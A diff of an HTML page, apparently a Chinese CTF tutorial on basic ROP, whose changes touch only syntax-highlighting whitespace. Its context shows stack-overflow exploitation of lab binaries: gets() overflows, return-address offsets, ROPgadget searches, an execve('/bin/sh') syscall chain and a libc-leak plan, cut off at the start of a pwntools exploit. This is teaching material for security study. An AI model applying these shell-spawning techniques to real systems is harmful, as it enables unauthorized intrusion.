@@ -4,17 +4,17 @@
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
-</code></pre></div> <p>可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。</p> <div class=highlight><pre><span></span><code><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=n>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
-<span class=p>{</span>
-  <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [sp+1Ch] [bp-64h]@1</span>
+</code></pre></div> <p>可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。</p> <div class=highlight><pre><span></span><code><span class=kt>int</span><span class=w> </span><span class=kr>__cdecl</span><span class=w> </span><span class=n>main</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=k>const</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>argv</span><span class=p>,</span><span class=w> </span><span class=k>const</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>envp</span><span class=p>)</span><span class=w></span>
+<span class=p>{</span><span class=w></span>
+<span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>v4</span><span class=p>;</span><span class=w> </span><span class=c1>// [sp+1Ch] [bp-64h]@1</span>
 
-  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-  <span class=n>setvbuf</span><span class=p>(</span><span class=n>_bss_start</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-  <span class=n>puts</span><span class=p>(</span><span class=s>&quot;There is something amazing here, do you know anything?&quot;</span><span class=p>);</span>
-  <span class=n>gets</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v4</span><span class=p>);</span>
-  <span class=n>printf</span><span class=p>(</span><span class=s>&quot;Maybe I will tell you next time !&quot;</span><span class=p>);</span>
-  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
-<span class=p>}</span>
+<span class=w>  </span><span class=n>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>setvbuf</span><span class=p>(</span><span class=n>_bss_start</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;There is something amazing here, do you know anything?&quot;</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>gets</span><span class=p>((</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v4</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Maybe I will tell you next time !&quot;</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w></span>
+<span class=p>}</span><span class=w></span>
 </code></pre></div> <p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现</p> <div class=highlight><pre><span></span><code><span class=nl>.text:</span><span class=err>080485</span><span class=nf>FD</span> <span class=no>secure</span>          <span class=no>proc</span> <span class=no>near</span>
 <span class=nl>.text:</span><span class=err>080485</span><span class=nf>FD</span>
 <span class=nl>.text:</span><span class=err>080485</span><span class=nf>FD</span> <span class=no>input</span>           <span class=err>=</span> <span class=no>dword</span> <span class=no>ptr</span> <span class=mi>-10</span><span class=no>h</span>
@@ -72,18 +72,18 @@ Breakpoint <span class=m>1</span>, 0x080486ae <span class=k>in</span> main <span
     NX:       NX disabled
     PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
     RWX:      Has RWX segments
-</code></pre></div> <p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序</p> <div class=highlight><pre><span></span><code><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=n>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
-<span class=p>{</span>
-  <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [sp+1Ch] [bp-64h]@1</span>
+</code></pre></div> <p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序</p> <div class=highlight><pre><span></span><code><span class=kt>int</span><span class=w> </span><span class=kr>__cdecl</span><span class=w> </span><span class=n>main</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=k>const</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>argv</span><span class=p>,</span><span class=w> </span><span class=k>const</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>envp</span><span class=p>)</span><span class=w></span>
+<span class=p>{</span><span class=w></span>
+<span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>v4</span><span class=p>;</span><span class=w> </span><span class=c1>// [sp+1Ch] [bp-64h]@1</span>
 
-  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-  <span class=n>puts</span><span class=p>(</span><span class=s>&quot;No system for you this time !!!&quot;</span><span class=p>);</span>
-  <span class=n>gets</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v4</span><span class=p>);</span>
-  <span class=n>strncpy</span><span class=p>(</span><span class=n>buf2</span><span class=p>,</span> <span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v4</span><span class=p>,</span> <span class=mh>0x64u</span><span class=p>);</span>
-  <span class=n>printf</span><span class=p>(</span><span class=s>&quot;bye bye ~&quot;</span><span class=p>);</span>
-  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
-<span class=p>}</span>
+<span class=w>  </span><span class=n>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;No system for you this time !!!&quot;</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>gets</span><span class=p>((</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v4</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>strncpy</span><span class=p>(</span><span class=n>buf2</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=k>const</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v4</span><span class=p>,</span><span class=w> </span><span class=mh>0x64u</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;bye bye ~&quot;</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w></span>
+<span class=p>}</span><span class=w></span>
 </code></pre></div> <p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p> <div class=highlight><pre><span></span><code><span class=nl>.bss:</span><span class=err>0804</span><span class=nf>A080</span>                 <span class=no>public</span> <span class=no>buf2</span>
 <span class=nl>.bss:</span><span class=err>0804</span><span class=nf>A080</span> <span class=c1>; char buf2[100]</span>
 </code></pre></div> <p>这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</p> <div class=highlight><pre><span></span><code>gef➤  b main
@@ -136,18 +136,18 @@ Start      End        Offset     Perm Path
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
-</code></pre></div> <p>可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 来查看源码</p> <div class=highlight><pre><span></span><code><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=n>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
-<span class=p>{</span>
-  <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [sp+1Ch] [bp-64h]@1</span>
+</code></pre></div> <p>可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 来查看源码</p> <div class=highlight><pre><span></span><code><span class=kt>int</span><span class=w> </span><span class=kr>__cdecl</span><span class=w> </span><span class=n>main</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=k>const</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>argv</span><span class=p>,</span><span class=w> </span><span class=k>const</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>envp</span><span class=p>)</span><span class=w></span>
+<span class=p>{</span><span class=w></span>
+<span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>v4</span><span class=p>;</span><span class=w> </span><span class=c1>// [sp+1Ch] [bp-64h]@1</span>
 
-  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-  <span class=n>puts</span><span class=p>(</span><span class=s>&quot;This time, no system() and NO SHELLCODE!!!&quot;</span><span class=p>);</span>
-  <span class=n>puts</span><span class=p>(</span><span class=s>&quot;What do you plan to do?&quot;</span><span class=p>);</span>
-  <span class=n>gets</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v4</span><span class=p>);</span>
-  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
-<span class=p>}</span>
-</code></pre></div> <p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考</p> <ul> <li><a href=https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8>https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></li> </ul> <p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p> <div class=highlight><pre><span></span><code><span class=n>execve</span><span class=p>(</span><span class=s>&quot;/bin/sh&quot;</span><span class=p>,</span><span class=nb>NULL</span><span class=p>,</span><span class=nb>NULL</span><span class=p>)</span>
+<span class=w>  </span><span class=n>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;This time, no system() and NO SHELLCODE!!!&quot;</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;What do you plan to do?&quot;</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>gets</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v4</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w></span>
+<span class=p>}</span><span class=w></span>
+</code></pre></div> <p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考</p> <ul> <li><a href=https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8>https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></li> </ul> <p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p> <div class=highlight><pre><span></span><code><span class=n>execve</span><span class=p>(</span><span class=s>&quot;/bin/sh&quot;</span><span class=p>,</span><span class=nb>NULL</span><span class=p>,</span><span class=nb>NULL</span><span class=p>)</span><span class=w></span>
 </code></pre></div> <p>其中，该程序是 32 位，所以我们需要使得</p> <ul> <li>系统调用号，即 eax 应该为 0xb</li> <li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li> <li>第二个参数，即 ecx 应该为 0</li> <li>第三个参数，即 edx 应该为 0</li> </ul> <p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets的方法，我们可以使用 ropgadgets 这个工具。</p> <p>首先，我们来寻找控制 eax 的gadgets</p> <div class=highlight><pre><span></span><code>➜  ret2syscall ROPgadget --binary rop  --only <span class=s1>&#39;pop|ret&#39;</span> <span class=p>|</span> grep <span class=s1>&#39;eax&#39;</span>
 0x0809ddda : pop eax <span class=p>;</span> pop ebx <span class=p>;</span> pop esi <span class=p>;</span> pop edi <span class=p>;</span> ret
 0x080bb196 : pop eax <span class=p>;</span> ret
@@ -215,16 +215,16 @@ Unique gadgets found: 4
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
-</code></pre></div> <p>源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置</p> <div class=highlight><pre><span></span><code><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=n>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
-<span class=p>{</span>
-  <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [sp+1Ch] [bp-64h]@1</span>
+</code></pre></div> <p>源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置</p> <div class=highlight><pre><span></span><code><span class=kt>int</span><span class=w> </span><span class=kr>__cdecl</span><span class=w> </span><span class=n>main</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=k>const</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>argv</span><span class=p>,</span><span class=w> </span><span class=k>const</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>envp</span><span class=p>)</span><span class=w></span>
+<span class=p>{</span><span class=w></span>
+<span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>v4</span><span class=p>;</span><span class=w> </span><span class=c1>// [sp+1Ch] [bp-64h]@1</span>
 
-  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-  <span class=n>setvbuf</span><span class=p>(</span><span class=n>_bss_start</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-  <span class=n>puts</span><span class=p>(</span><span class=s>&quot;RET2LIBC &gt;_&lt;&quot;</span><span class=p>);</span>
-  <span class=n>gets</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v4</span><span class=p>);</span>
-  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
-<span class=p>}</span>
+<span class=w>  </span><span class=n>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>setvbuf</span><span class=p>(</span><span class=n>_bss_start</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;RET2LIBC &gt;_&lt;&quot;</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>gets</span><span class=p>((</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v4</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w></span>
+<span class=p>}</span><span class=w></span>
 </code></pre></div> <p>可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在</p> <div class=highlight><pre><span></span><code>➜  ret2libc1 ROPgadget --binary ret2libc1 --string <span class=s1>&#39;/bin/sh&#39;</span>          
 Strings <span class=nv>information</span>
 <span class=o>============================================================</span>
@@ -261,17 +261,17 @@ Strings <span class=nv>information</span>
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
-</code></pre></div> <p>可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出</p> <div class=highlight><pre><span></span><code><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=n>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
-<span class=p>{</span>
-  <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [sp+1Ch] [bp-64h]@1</span>
+</code></pre></div> <p>可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出</p> <div class=highlight><pre><span></span><code><span class=kt>int</span><span class=w> </span><span class=kr>__cdecl</span><span class=w> </span><span class=n>main</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=k>const</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>argv</span><span class=p>,</span><span class=w> </span><span class=k>const</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>envp</span><span class=p>)</span><span class=w></span>
+<span class=p>{</span><span class=w></span>
+<span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>v4</span><span class=p>;</span><span class=w> </span><span class=c1>// [sp+1Ch] [bp-64h]@1</span>
 
-  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-  <span class=n>puts</span><span class=p>(</span><span class=s>&quot;No surprise anymore, system disappeard QQ.&quot;</span><span class=p>);</span>
-  <span class=n>printf</span><span class=p>(</span><span class=s>&quot;Can you find it !?&quot;</span><span class=p>);</span>
-  <span class=n>gets</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v4</span><span class=p>);</span>
-  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
-<span class=p>}</span>
+<span class=w>  </span><span class=n>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;No surprise anymore, system disappeard QQ.&quot;</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Can you find it !?&quot;</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=n>gets</span><span class=p>((</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v4</span><span class=p>);</span><span class=w></span>
+<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w></span>
+<span class=p>}</span><span class=w></span>
 </code></pre></div> <p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p> <ul> <li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li> <li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而 libc 在github上有人进行收集，如下</li> <li><a href=https://github.com/niklasb/libc-database>https://github.com/niklasb/libc-database</a></li> </ul> <p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system函数的地址。</p> <p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p> <p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p> <ul> <li><a href=https://github.com/lieanu/LibcSearcher>https://github.com/lieanu/LibcSearcher</a></li> </ul> <p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p> <p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p> <ul> <li>泄露 __libc_start_main 地址</li> <li>获取 libc 版本</li> <li>获取 system 地址与 /bin/sh 的地址</li> <li>再次执行源程序</li> <li>触发栈溢出执行 system(‘/bin/sh’)</li> </ul> <p>exp 如下</p> <div class=highlight><pre><span></span><code><span class=ch>#!/usr/bin/env python</span>
 <span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
 <span class=kn>from</span> <span class=nn>LibcSearcher</span> <span class=kn>import</span> <span class=n>LibcSearcher</span>
